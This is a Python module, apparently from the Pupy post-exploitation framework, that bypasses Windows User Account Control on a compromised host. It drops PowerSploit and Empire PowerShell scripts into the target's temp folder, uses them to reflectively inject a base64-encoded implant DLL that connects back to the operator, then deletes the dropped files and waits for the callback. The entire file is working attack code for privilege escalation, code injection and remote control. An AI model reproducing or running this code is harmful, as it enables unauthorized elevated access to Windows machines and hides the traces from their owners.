# -*- coding: UTF8 -*-

import os, logging
import platform
import pupygen
from rpyc.utils.classic import upload
import base64
from tempfile import gettempdir, _get_candidate_names
import subprocess
from modules.lib.windows.powershell_upload import execute_powershell_script
import re

def bypassuac_through_trusted_publisher_certificate(module, rootPupyPath):
	'''
	Performs a bypass UAC attack by utilizing the trusted publisher certificate through process injection. 
	'''
	module.client.load_package("psutil")
	module.client.load_package("pupwinutils.processes")
	#Define Remote paths
	remoteTempFolder=module.client.conn.modules['os.path'].expandvars("%TEMP%")
	invokeReflectivePEInjectionRemotePath = "{0}.{1}".format(module.client.conn.modules['os.path'].join(remoteTempFolder, next(_get_candidate_names())), '.txt')
	invokeBypassUACRemotePath = "{0}.{1}".format(module.client.conn.modules['os.path'].join(remoteTempFolder, next(_get_candidate_names())), '.ps1')
	mainPowershellScriptRemotePath = "{0}.{1}".format(module.client.conn.modules['os.path'].join(remoteTempFolder, next(_get_candidate_names())), '.ps1')
	pupyDLLRemotePath = "{0}.{1}".format(module.client.conn.modules['os.path'].join(remoteTempFolder, next(_get_candidate_names())), '.txt')
	#Define Local paths
	mainPowerShellScriptPrivilegedLocalPath = os.path.join(gettempdir(),'mainPowerShellScriptPrivileged.txt')
	invokeBypassUACLocalPath = os.path.join(rootPupyPath, "pupy", "external", "Empire", "privesc", "Invoke-BypassUAC.ps1")
	invokeReflectivePEInjectionLocalPath = os.path.join(rootPupyPath,"pupy", "external", "PowerSploit", "CodeExecution", "Invoke-ReflectivePEInjection.ps1")
	invokeBypassUACLocalPath = os.path.join(rootPupyPath,"pupy", "external", "Empire", "privesc", "Invoke-BypassUAC.ps1")
	pupyDLLLocalPath = os.path.join(gettempdir(),'dllFile.txt')
	#Constants
	bypassUACcmd = "Invoke-BypassUAC -Command 'powershell.exe -ExecutionPolicy Bypass -file {0} -Verbose'".format(mainPowershellScriptRemotePath) #{0}=mainPowerShellScriptPrivileged.ps1
	byPassUACSuccessString = "DLL injection complete!"
	#main powershell script executed by bypassuac powershell script
	mainPowerShellScriptPrivileged = """
	cat {0} | Out-String  | iex
	cat {1} | Out-String  | iex
	Invoke-ReflectivePEInjection -PEBytes $PEBytes -ForceASLR
	""" #{0}=Invoke-ReflectivePEInjection.txt and {1}=dllFile.txt
	logging.info("Creating the Powershell script in %s locally"%(mainPowerShellScriptPrivilegedLocalPath))
	with open(mainPowerShellScriptPrivilegedLocalPath, 'w+') as w:
		w.write(mainPowerShellScriptPrivileged.format(invokeReflectivePEInjectionRemotePath, pupyDLLRemotePath))
	logging.info("Uploading powershell code for DLL injection in {0}".format(invokeReflectivePEInjectionRemotePath))
	upload(module.client.conn, invokeReflectivePEInjectionLocalPath, invokeReflectivePEInjectionRemotePath)
	#logging.info("Uploading powershell code for UAC Bypass in {0}".format())
	#upload(module.client.conn, invokeBypassUACLocalPath, invokeBypassUACRemotePath)
	logging.info("Uploading main powershell script executed by BypassUAC in {0}".format(mainPowerShellScriptPrivilegedLocalPath))
	upload(module.client.conn, mainPowerShellScriptPrivilegedLocalPath, mainPowershellScriptRemotePath)
	res=module.client.conn.modules['pupy'].get_connect_back_host()
	host, port = res.rsplit(':',1)
	logging.info("Address configured is %s:%s for pupy dll..."%(host,port))
	logging.info("Looking for process architecture...")
	if module.client.conn.modules['pupwinutils.processes'].is_x64_architecture() == True:
		logging.info("Target achitecture is x64, using a x64 dll")
		dllbuff=pupygen.get_edit_pupyx64_dll(module.client.get_conf())
	elif module.client.conn.modules['pupwinutils.processes'].is_x86_architecture() == True:
		logging.info("Target achitecture is x86, using a x86 dll")
		dllbuff=pupygen.get_edit_pupyx86_dll(module.client.get_conf())
	else:
		module.error("Target architecture is unknown (!= x86 or x64), abording...")
		return 
	logging.info("Creating the pupy dll in %s locally"%(pupyDLLLocalPath))
	with open(pupyDLLLocalPath, 'w+') as w:
		w.write('$PEBytes = [System.Convert]::FromBase64String("%s")'%(base64.b64encode(dllbuff)))
	logging.info("Uploading pupy dll in {0}".format(pupyDLLRemotePath))
	upload(module.client.conn, pupyDLLLocalPath, pupyDLLRemotePath)
	content = re.sub("Write-Verbose ","Write-Output ", open(invokeBypassUACLocalPath, 'r').read(), flags=re.I)
	logging.info("Starting BypassUAC script with the following cmd: {0}".format(bypassUACcmd))
 	output = execute_powershell_script(module, content, bypassUACcmd)
	logging.info("BypassUAC script output: %s\n"%(output))
	if byPassUACSuccessString in output:
		module.success("UAC bypassed")
	else:
		module.warning("Impossible to know what's happened remotely. You should active debug mode.")
	for aFile in [invokeReflectivePEInjectionRemotePath, invokeBypassUACRemotePath, mainPowershellScriptRemotePath, pupyDLLRemotePath]:
		logging.info("Deleting remote file {0}".format(aFile))
		output = module.client.conn.modules.subprocess.check_output("DEL /F /Q \"{0}\"".format(aFile), stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell = True)
		logging.debug("Delete Status: {0}".format(repr(output)))
	module.success("Waiting for a connection from the DLL (take few seconds)...")





